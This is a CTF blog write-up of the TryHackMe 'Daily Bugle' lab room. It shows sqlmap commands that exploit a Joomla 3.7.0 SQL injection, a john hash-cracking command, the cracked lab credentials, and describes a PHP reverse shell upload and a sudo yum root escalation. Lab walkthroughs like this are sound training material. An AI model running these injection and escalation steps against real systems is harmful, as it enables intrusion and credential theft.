@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>DailyBugle :: A flag with Somecookie — CTF write-ups by Somecookie</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="Hello everyone! I&amp;rsquo;m currently going through the offensive pentesting learning path on TryHackMe. So today I&amp;rsquo;m going to do the Daily Bugle room. This a hard room however I found it not that difficult! If you have done the previous rooms of the learning path you should be able to solve it!
+NMAP is your best-friend! As always I start with nmap!
+There are three open services SSH, an Apache webserver and a MariaDB database."/>
+<meta name="keywords" content=""/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="/posts/dailybugle/" />
+
+
+
+
+
+<link rel="stylesheet" href="/assets/style.css">
+
+
+<link rel="stylesheet" href="/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">
+<link rel="shortcut icon" href="/img/favicon.png">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="DailyBugle"/>
+<meta name="twitter:description" content="Daily Bugle - Compromise a Joomla CMS account via SQLi, practice cracking hashes and escalate your privileges by taking advantage of yum."/>
+
+
+
+<meta property="og:title" content="DailyBugle" />
+<meta property="og:description" content="Daily Bugle - Compromise a Joomla CMS account via SQLi, practice cracking hashes and escalate your privileges by taking advantage of yum." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/dailybugle/" />
+<meta property="article:published_time" content="2020-06-10T21:19:10+02:00" />
+<meta property="article:modified_time" content="2020-06-10T21:19:10+02:00" /><meta property="og:site_name" content="A flag with Somecookie" />
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">A flag with Somecookie</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+      
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title"><a href="/posts/dailybugle/">DailyBugle</a></h1>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          2020-06-10
+        </span>
+
+        
+          
+        
+      
+
+      <span class="post-author">— Written by Somecookie</span>
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          #<a href="/tags/joomla/">joomla</a>&nbsp;
+        
+          #<a href="/tags/sqli/">sqli</a>&nbsp;
+        
+          #<a href="/tags/yum/">yum</a>&nbsp;
+        
+          #<a href="/tags/sqlmap/">sqlmap</a>&nbsp;
+        
+          #<a href="/tags/tryhackme/">tryHackMe</a>&nbsp;
+        
+          #<a href="/tags/ctf/">CTF</a>&nbsp;
+        
+          #<a href="/tags/hard/">hard</a>&nbsp;
+        
+          #<a href="/tags/oscp-learning-path/">OSCP-learning-path</a>&nbsp;
+        
+      </span>
+    
+
+    
+      
+        <img src="/img/dailyBugle/banner.png" class="post-cover" />
+      
+    
+
+    <div class="post-content">
+      
+      <p>Hello everyone! I&rsquo;m currently going through the <code>offensive pentesting</code> learning path on TryHackMe. So today I&rsquo;m going to do the <a href="https://tryhackme.com/room/dailybugle">Daily Bugle</a> room. This a hard room however I found it not that difficult! If you have done the previous rooms of the learning path you should be able to solve it!</p>
+<h2 id="nmap-is-your-best-friend">NMAP is your best-friend!</h2>
+<p>As always I start with <code>nmap</code>!</p>
+
+  <img src="/img/dailyBugle/nmap.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>There are three open services <code>SSH</code>, an <code>Apache</code> webserver and a <code>MariaDB</code> database. I wanted to try something I learnt in the <a href="https://tryhackme.com/room/blue">Blue</a> room. <code>nmap</code> can run the script <code>vuln</code> to detect vulnerabilities on the remote server. Thus I ran a second scan <code>nmap -sC -sV --script=vuln 10.10.114.124</code>. I found out two interesting things with this scan, some subdirectories of the webserver</p>
+
+  <img src="/img/dailyBugle/enum.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>but most importantly, the CMS used, <code>Joomla! 3.7.0</code>, is vulnerable!</p>
+
+  <img src="/img/dailyBugle/joomla.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<h2 id="spidey-the-thief">Spidey the thief</h2>
+<p>Let&rsquo;s access the HORRENDOUS website&hellip;</p>
+
+  <img src="/img/dailyBugle/dailyBugle.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Okay <code>Spider-man</code> robbed a bank&hellip;Other than this masterpiece of article, there is nothing interesting on the website. Let&rsquo;s see what we can find on <a href="https://www.exploit-db.com/exploits/42033">ExploitDB</a> about Joomla 3.7.0.</p>
+
+  <img src="/img/dailyBugle/sqli.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>The command of the exploit tells us the available databases, let&rsquo;s run it without the <code>level=5</code> otherwise I take ages&hellip;</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://10.10.34.93/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34;</span> --risk<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> --random-agent --dbs -p list<span style="color:#f92672">[</span>fullordering<span style="color:#f92672">]</span>
+
+...
+
+available databases <span style="color:#f92672">[</span>5<span style="color:#f92672">]</span>:
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> information_schema
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> joomla
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> mysql
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> performance_schema
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> test
+</code></pre></div><p>The most interesting database is probably <code>joomla</code>, let&rsquo;s find out its tables:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://10.10.34.93/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34;</span> --risk<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> --random-agent --dbs -p list<span style="color:#f92672">[</span>fullordering<span style="color:#f92672">]</span> --threads <span style="color:#ae81ff">10</span> -D joomla --tables
+</code></pre></div><p>mmmh there are 72 tables&hellip;I guess <code>#__users</code> is the one we want to dump&hellip;</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://10.10.34.93/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34;</span> --risk<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> --random-agent --dbs -p list<span style="color:#f92672">[</span>fullordering<span style="color:#f92672">]</span> --threads <span style="color:#ae81ff">10</span> -D joomla -T <span style="color:#e6db74">&#34;#__users&#34;</span> --dump
+</code></pre></div><p>Bingo we find a user!</p>
+
+  <img src="/img/dailyBugle/superuser.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<h2 id="johnny">Johnny</h2>
+<p>The password is not in plaintext! That would be too easy. It&rsquo;s hashed with <code>bcrypt</code>.
+Let&rsquo;s try to brute-force it with our friend <code>john</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo john -format<span style="color:#f92672">=</span>bcrypt --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt hash.txt
+</code></pre></div><p>After a few long minutes we cracked the password! Ah yeah&hellip;<code>spiderman123</code>&hellip;how surprising&hellip;</p>
+
+  <img src="/img/dailyBugle/jonah.jpg"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>We have the credentials for the following user:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">id          811
+name        Super User
+email       jonah@tryhackme.com
+username    jonah
+password    spiderman123
+</code></pre></div><h2 id="the-super-template">The super template!</h2>
+<p>Since Jonah is the editor-in-chief, he is probably also admin of the website. Let&rsquo;s see if we can connect to the <code>Administrator</code> page we found in the <code>nmap</code> scan.</p>
+
+  <img src="/img/dailyBugle/admin.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>It works! After a few minutes looking around I finally found out where I could upload a reverse shell! Directly in the default template <code>protostar</code>!</p>
+
+  <img src="/img/dailyBugle/index.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Let&rsquo;s get the <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">reverse shell code</a>, put it in <code>index.php</code> with the desired IP address and port. Last thing left to do is to set up a listener with netcat&hellip;btw what&rsquo;s your favorite port?</p>
+<p>We have a shell!</p>
+
+  <img src="/img/dailyBugle/shell.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>But don&rsquo;t be too happy, the user <code>apache</code> is&hellip;mmeeeh&hellip; you can&rsquo;t even access the home directory of the other user <code>jjameson</code> where the flag is probably located&hellip;</p>
+<h2 id="its-time-for-the-cutest-peas-in-the-world">It&rsquo;s time for the cutest peas in the world!</h2>
+
+  <img src="/img/dailyBugle/peass.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Let&rsquo;s upload <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">linpeas</a> onto the webserver&hellip;for example in <code>/dev/shm</code> with a simple http server.</p>
+
+  <img src="/img/dailyBugle/upload.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>There is something odd in the results from linpeas&hellip;a password in <code>/var/www/html/configuration.php</code>&hellip;but for what??!</p>
+
+  <img src="/img/dailyBugle/pwd.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<h2 id="and-as-always-dont-forget-ssh">And as always don&rsquo;t forget SSH</h2>
+<p>I was stuck on this&hellip;for ages&hellip;I have a username, a password, ssh is open, I wonder what are the links between those&hellip;oh&hellip;</p>
+
+  <img src="/img/dailyBugle/facepalm.jpg"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>I connect with SSH  with the user <code>jjameson</code> and the password found by linpeas and BAM it works! Plus I get the <code>user.txt</code> flag.</p>
+<h2 id="not-the-biggest-mountain">Not the biggest mountain</h2>
+<p>Let&rsquo;s first use <code>sudo -l</code> to see our permissions:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>jjameson@dailybugle ~<span style="color:#f92672">]</span>$ sudo -l
+Matching Defaults entries <span style="color:#66d9ef">for</span> jjameson on dailybugle:
+    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS&#34;</span>, env_keep<span style="color:#f92672">+=</span><span style="color:#e6db74">&#34;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&#34;</span>,
+    env_keep<span style="color:#f92672">+=</span><span style="color:#e6db74">&#34;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&#34;</span>, env_keep<span style="color:#f92672">+=</span><span style="color:#e6db74">&#34;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&#34;</span>, env_keep<span style="color:#f92672">+=</span><span style="color:#e6db74">&#34;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&#34;</span>,
+    secure_path<span style="color:#f92672">=</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin
+
+User jjameson may run the following commands on dailybugle:
+    <span style="color:#f92672">(</span>ALL<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/yum
+
+</code></pre></div><p>We can run <code>sudo</code> on <code>yum</code> without password! Let&rsquo;s use the exploit found on <a href="https://gtfobins.github.io/gtfobins/yum/">GTFOBins</a> and spawn a root shell!</p>
+
+  <img src="/img/dailyBugle/gtfo.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Simply copy it and&hellip;</p>
+
+  <img src="/img/dailyBugle/root.jpg"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>As always the root flag is in <code>/root/root.txt</code>. We are done! You know what it means&hellip;DELETE EVERYTHING!!!</p>
+
+  <img src="/img/dailyBugle/rm.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
+
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h">Read other posts</span>
+            <hr />
+          </div>
+          <div class="pagination__buttons">
+            
+            
+              <span class="button next">
+                <a href="/posts/dogcat/">
+                  <span class="button__text">Dogcat</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+
+    
+      
+        
+
+      
+    
+
+    </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">A flag with Somecookie</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+        <span>© 2020 Powered by <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span>
+        <span>Theme created by <a href="https://twitter.com/panr" target="_blank" rel="noopener">panr</a></span>
+      </div>
+    
+  </div>
+</footer>
+
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
+
+
+      
+    </div>
+
+    
+  </body>
+</html>
